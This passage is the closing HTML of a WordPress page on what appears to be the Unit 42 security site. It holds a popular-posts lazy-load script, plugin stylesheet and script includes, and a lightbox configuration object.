                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
